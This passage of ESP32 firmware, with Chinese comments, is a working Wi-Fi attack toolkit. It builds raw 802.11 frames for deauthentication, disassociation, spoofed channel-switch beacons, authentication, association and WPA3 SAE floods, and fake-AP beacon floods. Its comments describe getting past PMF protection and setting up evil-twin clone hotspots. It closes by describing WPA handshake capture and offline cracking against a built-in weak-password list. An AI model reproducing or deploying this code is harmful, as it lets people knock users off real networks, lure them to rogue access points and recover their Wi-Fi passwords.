  f[24] = 0x00; f[25] = 0x00;    // Auth Algorithm: Open System
  f[26] = 0x01; f[27] = 0x00;    // Auth SEQ: 1
  f[28] = 0x00; f[29] = 0x00;    // Status: 0
  return 30;
}

// WPA3 SAE Commit (Auth Algorithm=3, SEQ=1): 随机 scalar/element, AP 必须做椭圆曲线
// 运算后才发现无效 —— 高帧率发送可把 AP 的 SAE 运算资源打满。
static uint16_t buildSaeCommitFrame(const uint8_t bssid[6], uint8_t *f) {
  uint8_t src[6];
  fillRandomMac(src);
  uint16_t i = 0;
  f[i++] = 0xB0; f[i++] = 0x00;
  f[i++] = 0x3A; f[i++] = 0x01;
  memcpy(f + i, bssid, 6); i += 6;   // Address 1: AP
  memcpy(f + i, src, 6);   i += 6;   // Address 2: 随机客户端
  memcpy(f + i, bssid, 6); i += 6;   // Address 3: BSSID
  f[i++] = 0x00; f[i++] = 0x00;      // Sequence Control
  f[i++] = 0x03; f[i++] = 0x00;      // Auth Algorithm: SAE
  f[i++] = 0x01; f[i++] = 0x00;      // Auth SEQ: Commit
  f[i++] = 0x00; f[i++] = 0x00;      // Status: 0
  f[i++] = 0x13; f[i++] = 0x00;      // Group: 19 (P-256)
  for (int k = 0; k < 32; k++) f[i++] = (uint8_t)(esp_random() & 0xFF);  // Scalar
  for (int k = 0; k < 64; k++) f[i++] = (uint8_t)(esp_random() & 0xFF);  // Element
  return i;
}

// 关联请求 (Subtype=0): 认证泛洪的后续阶段, 让 AP 分配 AID/建表。
static uint16_t buildAssocReqFrame(const uint8_t bssid[6], const uint8_t src[6],
                                   const String &ssidIn, uint8_t *f) {
  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  uint16_t i = 0;
  f[i++] = 0x00; f[i++] = 0x00;      // 管理 / Association Request
  f[i++] = 0x3A; f[i++] = 0x01;
  memcpy(f + i, bssid, 6); i += 6;   // Address 1: AP
  memcpy(f + i, src, 6);   i += 6;   // Address 2: 随机客户端
  memcpy(f + i, bssid, 6); i += 6;   // Address 3: BSSID
  f[i++] = 0x00; f[i++] = 0x00;      // Sequence Control
  f[i++] = 0x11; f[i++] = 0x04;      // Capability: ESS + Privacy + ShortSlot
  f[i++] = 0x0A; f[i++] = 0x00;      // Listen Interval
  String ssid = ssidIn.length() ? ssidIn : String("probe");
  if (ssid.length() > 32) ssid = ssid.substring(0, 32);
  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();
  for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
  f[i++] = 0x01; f[i++] = 0x08;
  for (int k = 0; k < 8; k++) f[i++] = RATES[k];
  return i;
}

// 广播数据帧 (Subtype=8 Data): LLC/SNAP + 随机载荷, 用于占满空口/干扰客户端。
static uint16_t buildBroadcastDataFrame(const uint8_t bssid[6], uint8_t *f) {
  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  static const uint8_t SNAP[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00};
  uint8_t src[6];
  fillRandomMac(src);
  uint16_t i = 0;
  f[i++] = 0x08; f[i++] = 0x01;      // Data, ToDS=0/FromDS=0
  f[i++] = 0x00; f[i++] = 0x00;
  memcpy(f + i, BROADCAST, 6); i += 6;
  memcpy(f + i, src, 6);       i += 6;
  memcpy(f + i, bssid, 6);     i += 6;
  f[i++] = 0x00; f[i++] = 0x00;
  memcpy(f + i, SNAP, 8); i += 8;
  const uint8_t pay = (uint8_t)(32 + (esp_random() % 33));   // 32..64 字节随机载荷
  for (uint8_t k = 0; k < pay; k++) f[i++] = (uint8_t)(esp_random() & 0xFF);
  return i;
}

/* ---------------- 双频信道模型 (P0: 5GHz 仅 C5) ----------------
 * 2.4G: ch 1..14; 5G: ch 36..165。两组信道号不重叠, 因此 band 可由信道号推导,
 * 不必在 API/状态里重复传 band (API 仍接受可选 band 字段以指定跳频起点)。
 * DFS 信道 52..144 受雷达检测影响, 抓包跳频时默认跳过。
 * 非 C5 芯片在编译期裁掉 5G 表与校验, 行为与改造前完全一致。 */
#if SOC_WIFI_SUPPORT_5G
static const uint8_t kChannels5G[] = {
  36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
  132, 136, 140, 144, 149, 153, 157, 161, 165
};
static const uint8_t kChannels5GCount = sizeof(kChannels5G) / sizeof(kChannels5G[0]);
static bool isDfs5G(uint8_t ch) { return ch >= 52 && ch <= 144; }
static bool isValid5GChannel(int ch) {
  for (uint8_t i = 0; i < kChannels5GCount; i++) {
    if (kChannels5G[i] == ch) return true;
  }
  return false;
}
#endif

// 是否 5GHz 信道 (非 C5 恒为 false)
static bool isBand5G(uint8_t ch) {
#if SOC_WIFI_SUPPORT_5G
  return ch >= 32;
#else
  (void)ch;
  return false;
#endif
}

// P0 抓包/侦察允许的信道: 2.4G 1..14; 5G 需 C5 且在信道表内
static bool isValidSniffChannel(int ch) {
  if (ch >= 1 && ch <= 14) return true;
#if SOC_WIFI_SUPPORT_5G
  return isValid5GChannel(ch);
#else
  return false;
#endif
}

// 解析可选 band 字段: 5=5GHz, 2=2.4GHz, 0=未指定
static uint8_t parseBandArg(const String &s) {
  if (s == "5" || s == "5G" || s == "5g") return 5;
  if (s == "24" || s == "2" || s == "2.4" || s == "2.4G") return 2;
  return 0;
}

// 取下一个跳频信道: 2.4G 1..13 循环; 5G 在信道表内循环 (skipDfs 时跳过 DFS)
static uint8_t nextHopChannel(uint8_t ch, bool skipDfs) {
#if SOC_WIFI_SUPPORT_5G
  if (isBand5G(ch)) {
    int cur = -1;
    for (uint8_t i = 0; i < kChannels5GCount; i++) {
      if (kChannels5G[i] == ch) { cur = i; break; }
    }
    for (uint8_t step = 1; step <= kChannels5GCount; step++) {
      int idx = (cur + step + kChannels5GCount) % kChannels5GCount;
      uint8_t c = kChannels5G[idx];
      if (!skipDfs || !isDfs5G(c)) return c;
    }
    return ch;
  }
#else
  (void)skipDfs;
#endif
  return (ch >= 13) ? 1 : (uint8_t)(ch + 1);
}

// 跳频起点: 按目标 band 选一个合法起始信道
static uint8_t hopStartChannel(uint8_t band, uint8_t fallback) {
#if SOC_WIFI_SUPPORT_5G
  if (band == 5) return isBand5G(fallback) ? fallback : 36;
#endif
  if (band == 2 && isBand5G(fallback)) return 1;
  return fallback;
}

// AP 热点可用信道: 2.4G 1..13; 5G 仅非 DFS (36-48 / 149-165)。
// DFS 信道 (52-144) 作为 AP 需先做雷达检测 (CAC), softAP 不支持, 故不开放。
static bool isValidApChannel(int ch) {
  if (ch >= 1 && ch <= 13) return true;
#if SOC_WIFI_SUPPORT_5G
  return isValid5GChannel(ch) && !isDfs5G((uint8_t)ch);
#else
  return false;
#endif
}

// 邪恶双子「克隆热点」可用信道: 2.4G 1..14 (允许日本 14ch) 或 5G 非 DFS。
// 克隆热点与主目标同信道启动 → 主目标信道必须能起 AP。
static bool isValidCloneChannel(int ch) {
  if (ch >= 1 && ch <= 14) return true;
#if SOC_WIFI_SUPPORT_5G
  return isValid5GChannel(ch) && !isDfs5G((uint8_t)ch);
#else
  return false;
#endif
}

// 构建合法信标帧 (802.11 管理帧 Subtype=8) —— 「假 AP」/CSA 共用。
// 依据 PR #438 的真机经验, 下面三点缺一不可, 否则 Wi-Fi 6 客户端会整帧丢弃:
//   1. Privacy 位置 1 时必须带标准 RSN IE (只置位不带 IE 的帧会被丢掉);
//   2. TSF 与 Sequence Control 必须单调递增 (常量会被判为重复帧);
//   3. Supported Rates 用标准 8 速率集, 不塞伪造的 HE 能力元素。
// extraIe/extraLen 用于追加附加 IE (如 CSA)。buffer 至少 160 字节, 返回帧长 (0 = BSSID 非法)。
static uint16_t buildBeaconFrameEx(const String &ssidIn, const String &bssidIn, uint8_t channel,
                                   bool privacy, const uint8_t *extraIe, uint8_t extraLen, uint8_t *f) {
  uint8_t mac[6];
  String bssid = bssidIn;
  bssid.trim();
  if (!parseBssid(bssid, mac)) return 0;
  String ssid = ssidIn;
  if (ssid.length() > 32) ssid = ssid.substring(0, 32);
  static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  static const uint8_t RSN_IE[22] = {
      0x30, 0x14,                    // RSN IE (48), 长度 20
      0x01, 0x00,                    // RSN Version 1
      0x00, 0x0F, 0xAC, 0x04,        // Group cipher: CCMP
      0x01, 0x00,                    // Pairwise cipher 数量 1
      0x00, 0x0F, 0xAC, 0x04,        // Pairwise: CCMP
      0x01, 0x00,                    // AKM 数量 1
      0x00, 0x0F, 0xAC, 0x02,        // AKM: PSK (WPA2-Personal)
      0x00, 0x00                     // RSN Capabilities: 无
  };
  static uint64_t tsf = 0;
  static uint16_t seq = 0;
  tsf += 100000;                                // 每帧 +100ms, 与 100 TU 信标间隔一致
  seq = (uint16_t)((seq + 1) & 0x0FFF);         // 12 位序列号循环
  uint16_t i = 0;
  f[i++] = 0x80; f[i++] = 0x00;                 // Frame Control: 管理 / Beacon
  f[i++] = 0x00; f[i++] = 0x00;                 // Duration
  memcpy(f + i, BROADCAST, 6); i += 6;          // Address 1: 广播
  memcpy(f + i, mac, 6); i += 6;                // Address 2: BSSID (伪造)
  memcpy(f + i, mac, 6); i += 6;                // Address 3: BSSID
  f[i++] = (uint8_t)((seq & 0x000F) << 4);      // Sequence Control 低 4 位
  f[i++] = (uint8_t)(seq >> 4);                 //                  高 8 位
  memcpy(f + i, &tsf, 8); i += 8;               // Timestamp (小端)
  f[i++] = 0x64; f[i++] = 0x00;                 // Beacon Interval (100 TU)
  f[i++] = privacy ? 0x11 : 0x01;               // Capability: ESS (+ Privacy)
  f[i++] = 0x04;                                //   + ShortSlotTime
  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();  // SSID IE
  for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
  f[i++] = 0x01; f[i++] = 0x08;                 // Supported Rates IE
  for (int k = 0; k < 8; k++) f[i++] = RATES[k];
  // DS Parameter (信道): 仅 2.4G 信标携带; 5G 客户端按中心频率推信道, 带 DS IE 反而违规
  if (!isBand5G(channel)) {
    f[i++] = 0x03; f[i++] = 0x01; f[i++] = channel;
  }
  if (privacy) { memcpy(f + i, RSN_IE, sizeof(RSN_IE)); i += sizeof(RSN_IE); }
  if (extraIe && extraLen) { memcpy(f + i, extraIe, extraLen); i += extraLen; }
  return i;
}

static uint16_t buildBeaconFrame(const String &ssidIn, const String &bssidIn, uint8_t channel, uint8_t *f) {
  return buildBeaconFrameEx(ssidIn, bssidIn, channel, false, nullptr, 0, f);
}

// ---- CSA (Channel Switch Announcement) 强制下线 (Deauth 被驱动拒绝时的兜底) ----
// 用冒充目标 AP BSSID 的 CSA 帧让客户端"跟随 AP 切换信道"从而脱离真实网络。
// 信标本身按 WPA2 合法帧构造 (含 RSN IE 与单调 TSF/序列号), 否则 Wi-Fi 6 客户端整帧丢弃。
static uint16_t buildCsaBeaconFrame(const String &ssidIn, const String &bssidIn,
                                   uint8_t curCh, uint8_t newCh, uint8_t *f) {
  // CSA IE (Element 37): mode=1, new channel, switch count=1
  const uint8_t csaIe[5] = {0x25, 0x03, 0x01, newCh, 0x01};
  return buildBeaconFrameEx(ssidIn, bssidIn, curCh, true, csaIe, sizeof(csaIe), f);
}

// TPC(35)+CSA(37) 双 IE 信标: 参考面板的「信标操作」——只改客户端对信道/功率的认知,
// 不直接断链 (伪装成 AP 正在调功率并迁移信道)。
static uint16_t buildTpcCsaBeacon(const String &ssidIn, const String &bssidIn,
                                  uint8_t curCh, uint8_t newCh, uint8_t *f) {
  const uint8_t ies[8] = {0x23, 0x01, 0x00, 0x25, 0x03, 0x01, newCh, 0x01};
  return buildBeaconFrameEx(ssidIn, bssidIn, curCh, true, ies, sizeof(ies), f);
}

// Spectrum Management CSA Action 帧 (Category 0 / Action 4) —— 部分客户端只认 Action 形式
static uint8_t buildCsaActionFrame(const String &bssidIn, uint8_t newCh, uint8_t *f) {
  uint8_t mac[6];
  String bssid = bssidIn;
  bssid.trim();
  if (!parseBssid(bssid, mac)) return 0;
  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t i = 0;
  f[i++] = 0xD0; f[i++] = 0x00;              // Action
  f[i++] = 0x00; f[i++] = 0x00;
  memcpy(f + i, BROADCAST, 6); i += 6;
  memcpy(f + i, mac, 6); i += 6;
  memcpy(f + i, mac, 6); i += 6;
  f[i++] = 0x00; f[i++] = 0x00;
  f[i++] = 0x00;                             // Category: Spectrum Management
  f[i++] = 0x04;                             // Action: Channel Switch Announcement
  f[i++] = 0x25; f[i++] = 0x03; f[i++] = 0x01; f[i++] = newCh; f[i++] = 0x01;
  return i;
}

// 为目标 AP 预构 CSA 帧; 2.4G 目标挑一个远端信道 (<=6→13, 否则→1), 5G 同理。
static bool csaPrepare(const String &ssid, const String &bssid, uint8_t curCh) {
  if (ssid.length() == 0 || curCh == 0) return false;
  uint8_t newCh;
  if (isBand5G(curCh)) newCh = (curCh <= 48) ? 165 : 36;
  else newCh = (curCh <= 6) ? 13 : 1;
  if (newCh == curCh) newCh = (curCh == 1) ? 13 : 1;
  sDeauth.csaNewChannel = newCh;
  sDeauth.csaBeaconLen = buildCsaBeaconFrame(ssid, bssid, curCh, newCh, sDeauth.csaBeacon);
  sDeauth.csaActionLen = buildCsaActionFrame(bssid, newCh, sDeauth.csaAction);
  return sDeauth.csaBeaconLen > 0;
}

/* ---------------- 攻击技术调度 (参考面板: 主攻击模式 + 组合攻击) ----------------
 * 主攻击模式决定基础技术集合, 组合攻击在其之上追加; 两者合并成位掩码后按位轮询,
 * 每个发送周期换一种技术 —— 只用一个发送节奏, 避免多定时器争抢射频。 */
// 组合攻击参数: 接受位掩码整数, 或逗号分隔的技术名 (deauth,disassoc,csa,tpc,auth,assoc,sae,bcast,beacon)
static uint16_t parseComboMask(const String &v) {
  String s = v;
  s.trim();
  if (s.length() == 0) return 0;
  bool numeric = true;
  for (size_t i = 0; i < s.length(); i++) {
    if (!isdigit((unsigned char)s[i])) { numeric = false; break; }
  }
  if (numeric) return (uint16_t)s.toInt();
  uint16_t mask = 0;
  int start = 0;
  while (start <= (int)s.length()) {
    int comma = s.indexOf(',', start);
    if (comma < 0) comma = (int)s.length();
    String t = s.substring(start, comma);
    t.trim();
    t.toLowerCase();
    if (t == "deauth") mask |= ATK_DEAUTH;
    else if (t == "disassoc") mask |= ATK_DISASSOC;
    else if (t == "csa") mask |= ATK_CSA;
    else if (t == "tpc" || t == "tpc+csa") mask |= ATK_TPC_CSA;
    else if (t == "auth") mask |= ATK_AUTH_FLOOD;
    else if (t == "assoc") mask |= ATK_ASSOC_FLOOD;
    else if (t == "sae") mask |= ATK_SAE_FLOOD;
    else if (t == "bcast") mask |= ATK_BCAST;
    else if (t == "beacon") mask |= ATK_BEACON;
    start = comma + 1;
  }
  return mask;
}

static uint16_t deauthTechMask() {
  uint16_t mask = 0;
  switch (sDeauth.primaryMode) {
    case 1: {  // 按加密分流 · 按加密套件选向量
      String a = sTarget.auth;
      a.toUpperCase();
      if (a.indexOf("WPA3") >= 0 || a.indexOf("SAE") >= 0) mask |= ATK_SAE_FLOOD | ATK_DEAUTH;
      else if (a.indexOf("WPA") >= 0) mask |= ATK_DEAUTH | ATK_DISASSOC;
      else mask |= ATK_DISASSOC | ATK_AUTH_FLOOD;   // 开放网络: 泛洪为主
      break;
    }
    case 2:  // 不使用主攻击 · 只发组合攻击
      break;
    default: // 0 = PMF 绕过 · 全设备踢线 (组地址管理帧不受 PMF 保护)
      mask |= ATK_DEAUTH;
      break;
  }
  return (uint16_t)(mask | sDeauth.comboMask);
}

static const char *atkTechName(uint8_t bit) {
  switch (bit) {
    case 0: return "deauth";
    case 1: return "disassoc";
    case 2: return "csa";
    case 3: return "tpc+csa";
    case 4: return "auth-flood";
    case 5: return "assoc-flood";
    case 6: return "sae-flood";
    case 7: return "bcast-flood";
    case 8: return "beacon-flood";
    default: return "-";
  }
}

// 信标泛洪的假 AP 池: 扫描器/客户端通常要收到同一 BSSID 的多个信标才会上报,
// 因此维护固定的一小组 (SSID, BSSID) 按轮询重复广播, 而不是每帧换一个新身份
// (每帧新身份 = 每个假 AP 只出现 1 次, 真机上扫描不到)。
#define FAKE_AP_COUNT 8
struct FakeApEntry { uint8_t mac[6]; char ssid[12]; };
static FakeApEntry sFakeAps[FAKE_AP_COUNT];
static uint8_t sFakeApIdx = 0;
static uint8_t sFakeApBurstLeft = 0;   // 当前假 AP 还需连发的信标数
static bool sFakeApInited = false;
static void fakeApPoolInit(bool force) {
  if (sFakeApInited && !force) return;
  for (int i = 0; i < FAKE_AP_COUNT; i++) {
    fillRandomMac(sFakeAps[i].mac);
    snprintf(sFakeAps[i].ssid, sizeof(sFakeAps[i].ssid), "Free-%04X",
             (unsigned)(esp_random() & 0xFFFF));
  }
  sFakeApIdx = (uint8_t)(FAKE_AP_COUNT - 1);
  sFakeApBurstLeft = 0;
  sFakeApInited = true;
}

// 发送一种技术的一帧; 返回 ESP_OK 表示驱动接受 (总线成功率/错误码仍由调用方记录)。
static esp_err_t deauthSendTech(uint16_t tech) {
  static uint8_t buf[256];
  uint8_t bssid[6];
  if (!parseBssid(sDeauth.targetBssid, bssid)) return ESP_ERR_INVALID_ARG;
  const uint8_t curCh = apChannelActive ? apChannelActive : sDeauth.targetChannel;
  int len = 0;
  switch (tech) {
    case ATK_DEAUTH: {
      if (!sDeauth.frameReady) return ESP_ERR_INVALID_ARG;
      // 已学到客户端 MAC → 以定向单播为主 (广播 Deauth 常被 Wi-Fi 6 手机静默丢弃)。
      // 每 4 帧保留 1 帧广播, 覆盖「一直没发过包、还没被学到」的设备。
      if (sKnownStaCount > 0 && sDeauth.targetMacReady &&
          ((sDeauth.unicastCycle++ % 4) != 3)) {
        uint8_t uf[26];
        const uint8_t *sta = sKnownStas[sKnownStaCursor % sKnownStaCount].mac;
        sKnownStaCursor = (uint8_t)((sKnownStaCursor + 1) % sKnownStaCount);
        // 原因码轮换: 1=未指定 3=STA 离开 7=未关联 15=4-way 超时, 避免被客户端按固定码过滤
        static const uint8_t reasons[4] = {1, 3, 7, 15};
        const uint8_t reason = reasons[sDeauth.reasonCycle++ & 0x03];
        if (buildUnicastDeauth(sta, sDeauth.targetMac, reason, uf)) {
          const esp_err_t ue = wifi80211Tx(WIFI_IF_AP, uf, (int)sizeof(uf), true);
          if (ue == ESP_OK) sDeauth.unicastCount++;
          return ue;
        }
      }
      return wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
    }
    case ATK_DISASSOC:
      if (!buildDisassocFrameRaw(sDeauth.targetBssid, 1, buf)) return ESP_ERR_INVALID_ARG;
      len = 26;
      break;
    case ATK_CSA: {   // 伪造 CSA 信标 + Action, 让客户端跟随切信道
      bool ok = false;
      esp_err_t last = ESP_FAIL;
      if (sDeauth.csaBeaconLen) {
        last = wifiBeaconTx(sDeauth.csaBeacon, (int)sDeauth.csaBeaconLen);
        ok = (last == ESP_OK);
      }
      if (sDeauth.csaActionLen) {
        esp_err_t e2 = wifi80211Tx(WIFI_IF_AP, sDeauth.csaAction, (int)sDeauth.csaActionLen, true);
        if (!ok) last = e2;
      }
      return ok ? ESP_OK : last;
    }
    case ATK_TPC_CSA: {
      String ssid = sTarget.ssid.length() ? sTarget.ssid : sDeauth.targetBssid;
      len = (int)buildTpcCsaBeacon(ssid, sDeauth.targetBssid, curCh, sDeauth.csaNewChannel, buf);
      if (!len) return ESP_ERR_INVALID_ARG;
      break;
    }
    case ATK_AUTH_FLOOD:
      fillRandomMac(sDeauth.floodMac);
      len = (int)buildAuthFloodFrame(bssid, sDeauth.floodMac, buf);
      break;
    case ATK_ASSOC_FLOOD: {
      // 真实 AP 会丢弃未认证 MAC 的 AssocReq, 因此同一源 MAC 先认证再关联 (两阶段交替)。
      String ssid = sTarget.ssid.length() ? sTarget.ssid : String("probe");
      if (sDeauth.assocAuthPhase) {
        fillRandomMac(sDeauth.floodMac);
        len = (int)buildAuthFloodFrame(bssid, sDeauth.floodMac, buf);
      } else {
        len = (int)buildAssocReqFrame(bssid, sDeauth.floodMac, ssid, buf);
      }
      sDeauth.assocAuthPhase = !sDeauth.assocAuthPhase;
      break;
    }
    case ATK_SAE_FLOOD:
      len = (int)buildSaeCommitFrame(bssid, buf);
      break;
    case ATK_BCAST:
      len = (int)buildBroadcastDataFrame(bssid, buf);
      break;
    case ATK_BEACON: {   // 固定假 AP 池: 每个身份连发一小簇信标再轮换
      fakeApPoolInit(false);   // 扫描器要收到同一 BSSID 的多个信标才会上报
      if (sFakeApBurstLeft == 0) {
        sFakeApIdx = (uint8_t)((sFakeApIdx + 1) % FAKE_AP_COUNT);
        sFakeApBurstLeft = 6;
      }
      sFakeApBurstLeft--;
      const FakeApEntry &ap = sFakeAps[sFakeApIdx];
      char bs[18];
      snprintf(bs, sizeof(bs), "%02X:%02X:%02X:%02X:%02X:%02X",
               ap.mac[0], ap.mac[1], ap.mac[2], ap.mac[3], ap.mac[4], ap.mac[5]);
      len = (int)buildBeaconFrameEx(String(ap.ssid), String(bs), curCh, false, nullptr, 0, buf);
      if (!len) return ESP_ERR_INVALID_ARG;
      break;
    }
    default:
      return ESP_ERR_INVALID_ARG;
  }
  // 信标类帧统一走 STA 接口 (AP 接口注入的信标空口不可见, 详见 wifiBeaconTx)
  if (tech == ATK_BEACON || tech == ATK_TPC_CSA) return wifiBeaconTx(buf, len);
  return wifi80211Tx(WIFI_IF_AP, buf, len, true);
}

// 轮询下一个启用的技术位 (返回 1<<bit, 0 = 没有可用技术)
static uint16_t deauthNextTech(uint16_t mask) {
  for (int k = 0; k < ATK_TECH_COUNT; k++) {
    sDeauth.comboIndex = (uint8_t)((sDeauth.comboIndex + 1) % ATK_TECH_COUNT);
    uint16_t bit = (uint16_t)(1u << sDeauth.comboIndex);
    if (mask & bit) return bit;
  }
  return 0;
}

// 国家信道计划: 默认 "01"(world) 的 5G 可用信道极少 (不含 149-165), 对 5G 高信道做
// AP 切换 / 帧注入会返回 0x102 (ESP_ERR_INVALID_ARG)。显式设为 CN:
// 2.4G 1-13 + 5G 36-64 / 149-165, 覆盖国内路由常用频段。
static void applyWifiCountry() {
  wifi_country_t c = {};
  memcpy(c.cc, "CN", 2);
  c.schan = 1;
  c.nchan = 13;
  c.max_tx_power = 20;
  c.policy = WIFI_COUNTRY_POLICY_MANUAL;
  esp_err_t e = esp_wifi_set_country(&c);
  log("[wifi] 国家信道计划 CN (2.4G 1-13 / 5G 36-64,149-165) err=0x" +
      String((uint32_t)e, HEX));
}

// 前置声明: 射频重启后需按当前模块状态恢复 promiscuous 过滤
static bool syncPromiscuousEngine();

// 跨频段切换 (2.4G ↔ 5G) 或软 AP 运行中切不过去时的硬重配:
// 停射频 → 重启 → 切频段模式 → 写 AP 信道 → 切信道。SSID/密码/网关不变,
// 客户端短暂掉线后在新频段重连; 失败可断电/复位回落到 NVS 里的 2.4G 配置。
// 顺序有讲究: 停射频后调 esp_wifi_set_band_mode 返回 ESP_ERR_WIFI_NOT_STARTED (0x3002),
// 必须在 esp_wifi_start() 之后再切频段, 否则 5G 信道仍被拒 (0x102)。
static bool reconfigApChannelHard(uint8_t ch) {
  wifi_config_t cfg;
  if (esp_wifi_get_config(WIFI_IF_AP, &cfg) != ESP_OK) return false;
  cfg.ap.channel = ch;
  // 顺序很关键: 停射频 → 重启 (此时才能改频段) → 切频段 → 写 AP 信道 → 切信道
  const esp_err_t stopErr = esp_wifi_stop();
  const esp_err_t startErr = esp_wifi_start();
#if defined(SOC_WIFI_SUPPORT_5G) && SOC_WIFI_SUPPORT_5G
  const esp_err_t bandErr =
      esp_wifi_set_band_mode(isBand5G(ch) ? WIFI_BAND_MODE_5G_ONLY : WIFI_BAND_MODE_2G_ONLY);
#else
  const esp_err_t bandErr = ESP_OK;   // 单频芯片无需切频段模式
#endif
  const esp_err_t cfgErr = esp_wifi_set_config(WIFI_IF_AP, &cfg);
  esp_err_t chErr = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t cur = 0;
  wifi_second_chan_t sec;
  bool onCh = (esp_wifi_get_channel(&cur, &sec) == ESP_OK && cur == ch);
  if (!onCh) {   // 有些驱动版本在 AP 重启后才接受目标信道, 再试一次
    chErr = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    onCh = (esp_wifi_get_channel(&cur, &sec) == ESP_OK && cur == ch);
  }
  log("[rf] 硬重配信道 " + String(ch) + (isBand5G(ch) ? " (5G)" : " (2.4G)") +
      ": stop=0x" + String((uint32_t)stopErr, HEX) + " start=0x" + String((uint32_t)startErr, HEX) +
      " band=0x" + String((uint32_t)bandErr, HEX) + " cfg=0x" + String((uint32_t)cfgErr, HEX) +
      " ch=0x" + String((uint32_t)chErr, HEX) + " -> ch=" + String(cur));
  if (stopErr == ESP_OK && startErr == ESP_OK && cfgErr == ESP_OK && onCh) {
    apChannelActive = ch;
    syncPromiscuousEngine();   // 射频重启会清掉 promiscuous 过滤, 按需恢复
    return true;
  }
  return false;
}

// 临时切换 AP 空口信道到 ch (不修改 NVS 配置); 成功返回 true。ch 支持 2.4G(1-14) 与 5G(32-177, 仅双频芯片)。
// 目的: 单射频只能在本机信道上发帧 → 先对齐目标信道, Deauth 才能真实到达目标。
// 副作用: 已连热点的受测设备会短暂掉线 (未发 CSA 公告), 重新扫描后自动重连, Captive Portal 仍生效。
static bool applyApChannel(uint8_t ch) {
  if (ch < 1 || ch > 177) return false;
  if (ch == apChannelActive) return true;
#if defined(SOC_WIFI_SUPPORT_5G) && SOC_WIFI_SUPPORT_5G
  // C5 双频: 跨频段切信道必须先切频段模式, 否则 ch>14 直接返回 ESP_ERR_INVALID_ARG。
  esp_wifi_set_band_mode(isBand5G(ch) ? WIFI_BAND_MODE_5G_ONLY : WIFI_BAND_MODE_2G_ONLY);
#endif
  esp_err_t err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  if (err != ESP_OK) {
    // 软 AP 默认 HT40 运行时带固定副信道 (如 ch6 的副信道是 ch10), 直接单信道切换会被
    // 驱动拒绝 (ESP_FAIL)。先降到 HT20 再切, 成功率最高且不重启 AP。
    esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
    err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }
  uint8_t cur = 0;
  wifi_second_chan_t sec;
  if (err == ESP_OK && esp_wifi_get_channel(&cur, &sec) == ESP_OK && cur == ch) {
    apChannelActive = ch;
    return true;
  }
  // 兜底: 停射频后重配频段与 AP 信道再启动 (跨 2.4G/5G 只能走这条路)
  if (reconfigApChannelHard(ch)) return true;
  // 失败原因留证 (软 AP 运行时切信道被拒的根因定位): 只在失败时打, 不刷屏
  log("[rf] 切换信道 " + String(ch) + " 失败 (err=0x" + String((uint32_t)err, HEX) + ")");
  return false;
}

// 在指定信道启动软 AP (克隆热点/恢复原热点共用)。
// 双频芯片上 5G 信道必须先切频段模式: 否则 softAP 会「返回 true 但驻留在 2.4G」,
// 而 apChannelActive 仍记为 5G → 后续 Deauth 全发在错误频段, 表现为帧数一直涨、
// 目标手机却毫无反应 (真机踩坑: 目标在 5G ch149, 攻击却停在 ch11)。
// 启动后一律用 esp_wifi_get_channel 校验实际信道, 不一致时走硬重配。
static bool startSoftApOnChannel(const String &ssid, const char *pass, uint8_t ch,
                                 int hidden, uint8_t maxConn) {
  if (!isValidApChannel(ch)) return false;
#if defined(SOC_WIFI_SUPPORT_5G) && SOC_WIFI_SUPPORT_5G
  // 5G AP 带宽统一 HT20: 与目标 AP 带宽不一致时部分手机会拒绝关联
  esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
  esp_wifi_set_band_mode(isBand5G(ch) ? WIFI_BAND_MODE_5G_ONLY : WIFI_BAND_MODE_2G_ONLY);
#endif
  const String useSsid = ssid.length() ? ssid : apSsid;
  if (!WiFi.softAP(useSsid.c_str(), pass, ch, hidden, maxConn)) return false;
  uint8_t cur = 0;
  wifi_second_chan_t sec;
  if (esp_wifi_get_channel(&cur, &sec) == ESP_OK && cur == ch) {
    apChannelActive = ch;
    return true;
  }
  log("[rf] softAP 未按请求信道启动 (请求 ch" + String(ch) + " 实际 ch" + String(cur) +
      ") → 硬重配" + (isBand5G(ch) ? " (5G)" : ""));
  return reconfigApChannelHard(ch);
}

/* ---------------- 3. 握手包捕获与离线弱口令跑包 (Handshake & Crack) ----------------
 *
 * 真实实现 (不再按时间戳伪造 M1..M4):
 *
 *  捕获 — 把 AP 空口临时对齐到目标信道, 打开 esp_wifi promiscuous 只收数据帧,
 *         从 LLC 0x888E 的 EAPOL-Key 帧识别 4 次握手: M1 (ANonce)、M2
 *         (SNonce + MIC + RSN ie)、M3 (GTK)、M4 (ACK), 并解析 M1 的 PMKID KDE。
 *
 *  跑包 — 用内置 7,153 条弱口令逐条:
 *           PMK = PBKDF2-HMAC-SHA1(口令, 目标 SSID, 4096, 32)
 *           PTK = PRF-512(PMK, "Pairwise key expansion",
 *                         Min/Max(AA,SPA) ‖ Min/Max(ANonce,SNonce))
 *           MIC = HMAC-SHA1(PTK[0..16], M2 帧且 MIC 区置零)   (keyver 1 用 HMAC-MD5)
 *         与 M2 自带的 MIC 比对, 命中即该网络口令。每轮主循环只跑一条, 保证
 *         HTTP 服务在跑包期间仍能响应进度查询。
 *
